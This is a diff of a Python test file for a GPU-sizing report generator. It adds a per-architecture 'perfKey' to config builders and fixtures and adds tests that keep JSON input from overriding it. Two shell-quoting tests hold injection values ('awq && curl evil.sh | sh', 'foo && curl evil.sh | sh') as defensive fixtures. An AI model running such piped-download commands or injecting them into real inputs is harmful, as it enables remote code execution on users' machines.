@@ -119,6 +119,10 @@ def expected_cfg(pd):
     cfg.update({
         "bpp": BPP, "ctx": REQ["ctx"], "conc": REQ["conc"], "n_gpu": REQ["n_gpu"],
         "gpu": gr.GPUS[REQ["gpu"]], "nvlink": REQ["nvlink"], "kv_bpp": REQ["kv_bpp"],
+        # Off the card, as every builder copies it. Not an architecture field,
+        # but compute() reads it, so a builder that dropped it would differ
+        # from this cfg in every throughput figure.
+        "perfKey": gr.GPUS[REQ["gpu"]]["perfKey"],
     })
     return cfg
 
@@ -220,7 +224,7 @@ const GPU_TABLE=new Function(`${gt[0]}; return GPU_TABLE;`)();
 const G={};
 for(const [k,g] of Object.entries(GPU_TABLE)){
   G[k]={gb:g.gb,bw:g.bw,h:g.hyper,sp:g.spec,st:g.spot,tf:g.tflops,
-        name:g.name.replace(/ GB$/,'GB')};
+        name:g.name.replace(/ GB$/,'GB'),perfKey:g.perfKey};
 }
 const req=JSON.parse(process.argv[2]);
 const g=G[req.gpu];
@@ -235,6 +239,8 @@ for (const key of Object.keys(scope.MODEL_PRESETS)) {
     hasNVLink:req.nvlink, kvBytesPerValue:req.kv_bpp,
     gpuGB:g.gb, gpuBandwidth:g.bw, gpuTFLOPS:g.tf, gpuHyperCost:g.h,
     gpuSpecCost:g.sp, gpuSpotCost:g.st, gpuName:g.name,
+    // The key PERF is looked up by, off the row as readInputState() takes it.
+    perfKey:g.perfKey,
     attnMode:p.attn||'standard', swaWindow:p.swaWin||0,
     swaLocalLayers:p.swaLocal||0, mlaLatentDim:p.mlaDim||0,
     modelMaxCtx:p.maxCtx||131072,
@@ -619,6 +625,7 @@ def check_quant_is_shell_quoted():
     # override path — the same class of exposure hf_model already had, but
     # newly reachable for quant since the arch_fields rewrite.
     cfg = dict(gr.arch_fields(gr.PRESETS["llama31-8b"]), gpu=gr.GPUS["h100-80"],
+               perfKey=gr.GPUS["h100-80"]["perfKey"],
                n_gpu=1, ctx=8192, conc=1, bpp=0.5, quant="awq && curl evil.sh | sh")
     comp = gr.compute(cfg)
     assert comp["fits"], "test fixture doesn't fit — command would short-circuit before quant is even rendered"
@@ -631,6 +638,7 @@ test("a malicious quant value is shell-quoted in the generated command, not inte
 
 def check_hf_model_is_shell_quoted():
     cfg = dict(gr.arch_fields(gr.PRESETS["llama31-8b"]), gpu=gr.GPUS["h100-80"],
+               perfKey=gr.GPUS["h100-80"]["perfKey"],
                n_gpu=1, ctx=8192, conc=1, bpp=0.5, hf_model="foo && curl evil.sh | sh")
     comp = gr.compute(cfg)
     assert comp["fits"], "test fixture doesn't fit — command would short-circuit before hf_model is even rendered"
@@ -778,12 +786,74 @@ test("interactive_mode still asks — and honours the answer — on a card that 
      check_interactive_still_asks_where_it_matters)
 
 
-# ---- the vendor the PERF lookup has been reading all along ------------------
-# compute() has looked up PERF[cfg["vendor"]] since the constants were hoisted,
-# and no builder ever set the key, so every report silently took the nvidia
-# fallback. That is harmless while nvidia is the only vendor in the table and
-# actively wrong the moment it is not.
-print("\nEvery builder sets the vendor its constants are chosen by")
+# ---- the key the PERF lookup reads ------------------------------------------
+# compute() looked up PERF[cfg["vendor"]] for as long as the constants were
+# hoisted, and no builder set the key, so every report silently took the nvidia
+# fallback. It looks PERF up by cfg["perfKey"] now, because constants are
+# measured per architecture and one vendor spans several. A builder that drops
+# perfKey computes a card with no constants: every NVIDIA report on that path
+# would say throughput is not modelled. vendor is still set, and still pinned,
+# because it is the card's — it just selects nothing.
+print("\nEvery builder sets the perfKey its constants are chosen by")
+
+
+def builder_cfgs(gpu_key):
+    """cfg from each of the four builder paths, for one card."""
+    out = {"from_cli_args": gr.from_cli_args(
+        dict_args(cli_args_for("llama31-8b"), gpu=gpu_key))}
+    path = write_json({"preset": "llama31-8b", "gpu": gpu_key})
+    try:
+        out["from_json"] = gr.from_json(path)
+    finally:
+        os.remove(path)
+    path = write_json({"params": 8, "layers": 32, "kv_heads": 8, "gpu": gpu_key})
+    try:
+        out["from_json raw branch"] = gr.from_json(path)
+    finally:
+        os.remove(path)
+    out["interactive_mode"] = run_interactive_on(gpu_key, 1)
+    return out
+
+
+def dict_args(ns, **over):
+    """A copy of a SimpleNamespace with some attributes replaced."""
+    return types.SimpleNamespace(**dict(vars(ns), **over))
+
+
+def check_every_builder_sets_perf_key():
+    # Every catalog row, not one: the key is per row, and a builder that read it
+    # from somewhere other than the selected card would agree with the right
+    # answer on whichever row it happened to copy.
+    for gpu_key, gpu in gr.GPUS.items():
+        for builder, cfg in builder_cfgs(gpu_key).items():
+            assert "perfKey" in cfg, f"{builder} on {gpu_key}: cfg carries no perfKey"
+            assert cfg["perfKey"] == gpu["perfKey"], (
+                f"{builder} on {gpu_key}: perfKey={cfg['perfKey']!r}, "
+                f"the card's is {gpu['perfKey']!r}")
+
+test("from_cli_args / from_json / raw JSON / interactive_mode all set cfg['perfKey'] to the card's",
+     check_every_builder_sets_perf_key)
+
+
+def check_perf_key_tracks_the_card_not_the_json():
+    # Both from_json branches copy keys they do not recognise straight into
+    # cfg, so a JSON naming a perfKey would, unless overwritten, choose which
+    # constants a card runs on — another architecture's, or constants for a
+    # card that has none.
+    for spec in ({"preset": "llama31-8b", "gpu": REQ["gpu"], "perfKey": "no-such-key"},
+                 {"params": 8, "layers": 32, "kv_heads": 8, "gpu": REQ["gpu"],
+                  "perfKey": "no-such-key"}):
+        path = write_json(spec)
+        try:
+            cfg = gr.from_json(path)
+        finally:
+            os.remove(path)
+        branch = "preset" if "preset" in spec else "raw"
+        assert cfg["perfKey"] == gr.GPUS[REQ["gpu"]]["perfKey"], (
+            f"{branch} branch: a JSON-supplied perfKey overrode the card's own: {cfg['perfKey']!r}")
+
+test("a perfKey in the JSON cannot override the selected card's own, in either from_json branch",
+     check_perf_key_tracks_the_card_not_the_json)
 
 def check_every_builder_sets_vendor():
     want = gr.GPUS[REQ["gpu"]]["vendor"]
@@ -818,8 +888,8 @@ def check_vendor_tracks_the_card_not_the_json():
     finally:
         os.remove(path)
     assert cfg["vendor"] == gr.GPUS[REQ["gpu"]]["vendor"], (
-        "a JSON-supplied vendor overrode the card's own — that would run NVIDIA "
-        f"hardware on another vendor's constants: {cfg['vendor']!r}")
+        "a JSON-supplied vendor overrode the card's own — the report would name "
+        f"a vendor the hardware is not: {cfg['vendor']!r}")
 
 test("a vendor in the JSON cannot override the selected card's own",
      check_vendor_tracks_the_card_not_the_json)
@@ -827,14 +897,14 @@ test("a vendor in the JSON cannot override the selected card's own",
 
 def check_perf_lookup_actually_resolves():
     cfg = gr.from_cli_args(cli_args_for("llama31-8b"))
-    assert cfg["vendor"] in gr.PERF, (
-        f"cfg['vendor']={cfg['vendor']!r} is not a key in PERF, so compute() is "
-        "still taking the fallback branch this commit exists to retire")
+    assert cfg["perfKey"] in gr.PERF, (
+        f"cfg['perfKey']={cfg['perfKey']!r} is not a key in PERF, so compute() "
+        "has no constants for a card that has them")
     comp = gr.compute(cfg)
-    assert comp["perf_mbu"] == gr.PERF[cfg["vendor"]]["mbu"], (
-        "compute() did not use the constants belonging to cfg['vendor']")
+    assert comp["perf_mbu"] == gr.PERF[cfg["perfKey"]]["mbu"], (
+        "compute() did not use the constants belonging to cfg['perfKey']")
 
-test("the vendor a builder sets is a real PERF key, and compute() uses its constants",
+test("the perfKey a builder sets is a real PERF key, and compute() uses its constants",
      check_perf_lookup_actually_resolves)
 
 
@@ -865,8 +935,12 @@ test("a config that names no GPU gets the one the catalog marks default",
 # the same, apart from what is genuinely counted in boards.
 print("\nThe report reads the same however the silicon is packaged")
 
+# perfKey is explicit: this card exists to test packaging, and without a key it
+# would be a card with no throughput constants — every report built on it would
+# still read the same both ways, and so still pass, about something else.
 DUAL = {"gb": 128, "bw": 3276.8, "hyper": 6.0, "spec": 2.5, "spot": 1.2, "tflops": 383,
-        "name": "X", "vendor": "nvidia", "devices": 2, "form": "sxm", "caps": {"fp8": True}}
+        "name": "X", "vendor": "nvidia", "perfKey": "nvidia", "devices": 2, "form": "sxm",
+        "caps": {"fp8": True}}
 SINGLE = dict(DUAL, gb=64, bw=DUAL["bw"] / 2, tflops=DUAL["tflops"] / 2,
               hyper=DUAL["hyper"] / 2, spec=DUAL["spec"] / 2, spot=DUAL["spot"] / 2, devices=1)
 
@@ -875,7 +949,7 @@ def report_text(card, boards, preset="llama31-70b", bpp=2, conc=16, **over):
     """Every string generate() puts in the document, in order."""
     cfg = dict(gr.arch_fields(gr.PRESETS[preset]), bpp=bpp, ctx=8192, conc=conc,
                n_gpu=boards, gpu=card, nvlink=True, kv_bpp=2, vendor=card["vendor"],
-               hf_model="m", model_name="M", **over)
+               perfKey=card["perfKey"], hf_model="m", model_name="M", **over)
     card_obj = gr.ReportCard(cfg, output_path=os.devnull)
     seen = []
 
@@ -960,7 +1034,8 @@ def check_packaging_is_invisible_to_the_report():
     # exactly the double-count this change exists to prevent
     def hourly(card, boards):
         cfg = dict(gr.arch_fields(gr.PRESETS["llama31-70b"]), bpp=2, ctx=8192, conc=16,
-                   n_gpu=boards, gpu=card, nvlink=True, kv_bpp=2, vendor=card["vendor"])
+                   n_gpu=boards, gpu=card, nvlink=True, kv_bpp=2, vendor=card["vendor"],
+                   perfKey=card["perfKey"])
         c = gr.compute(cfg)
         return tuple(round(c[k], 6) for k in ("hourly_hyper", "hourly_spec", "hourly_spot"))
     assert hourly(DUAL, 1) == hourly(SINGLE, 2), (
@@ -1000,13 +1075,15 @@ def check_compute_is_blind_to_packaging():
     """
     bound = dict(params=30, active=10, layers=48, kv_heads=8, h_dim=128,
                  ctx=256, conc=256, bpp=2, kv_bpp=2, shared_exp=0, max_ctx=1048576)
-    dual = gr.compute(dict(bound, n_gpu=1, gpu=DUAL, nvlink=True, vendor="nvidia"))
-    single = gr.compute(dict(bound, n_gpu=2, gpu=SINGLE, nvlink=True, vendor="nvidia"))
+    dual = gr.compute(dict(bound, n_gpu=1, gpu=DUAL, nvlink=True, vendor="nvidia",
+                           perfKey=DUAL["perfKey"]))
+    single = gr.compute(dict(bound, n_gpu=2, gpu=SINGLE, nvlink=True, vendor="nvidia",
+                             perfKey=SINGLE["perfKey"]))
     # Python's compute() exports no compute-bound flag (the JS engine does), so
     # bindingness is established directly: ten times the bandwidth must not move
     # the saturated figure if the compute ceiling is what is holding it.
     faster = gr.compute(dict(bound, n_gpu=1, gpu=dict(DUAL, bw=DUAL["bw"] * 10),
-                             nvlink=True, vendor="nvidia"))
+                             nvlink=True, vendor="nvidia", perfKey=DUAL["perfKey"]))
     assert abs(faster["sat_tok"] - dual["sat_tok"]) < 1, (
         "the probe is bandwidth-bound, so it does not exercise the compute ceiling")
     skip = {"gpu"}
@@ -1085,7 +1162,7 @@ def report_strings(card, boards, **over):
     """
     cfg = dict(gr.arch_fields(gr.PRESETS["llama31-70b"]), ctx=8192, conc=16,
                n_gpu=boards, gpu=card, nvlink=True, kv_bpp=2, vendor=card["vendor"],
-               hf_model="m", model_name="M", **over)
+               perfKey=card["perfKey"], hf_model="m", model_name="M", **over)
     obj = gr.ReportCard(cfg, output_path=os.devnull)
     seen = []
 
@@ -1176,7 +1253,7 @@ def check_vram_breakdown_row_sums():
                                  ("qwen3-30b", 12, dict(DUAL, devices=1, gb=80, name="S"))):
         cfg = dict(gr.arch_fields(gr.PRESETS[preset]), bpp=2, ctx=8192, conc=16,
                    n_gpu=boards, gpu=card, nvlink=True, kv_bpp=2, vendor=card["vendor"],
-                   hf_model="m", model_name="M")
+                   perfKey=card["perfKey"], hf_model="m", model_name="M")
         comp = gr.compute(dict(cfg))
         blob = report_text(card, boards, preset=preset, bpp=2)
         # A metric cell is one Paragraph carrying its own label and value:
@@ -1229,7 +1306,7 @@ def check_recommended_board_count_actually_fits():
                                       ("dsv3-671b", 1, DUAL, 2)):
         cfg = dict(gr.arch_fields(gr.PRESETS[preset]), ctx=8192, conc=16, n_gpu=boards,
                    gpu=card, nvlink=True, kv_bpp=2, bpp=bpp, vendor=card["vendor"],
-                   hf_model="m", model_name="M")
+                   perfKey=card["perfKey"], hf_model="m", model_name="M")
         comp = gr.compute(dict(cfg))
         if comp["fits"]:
             continue
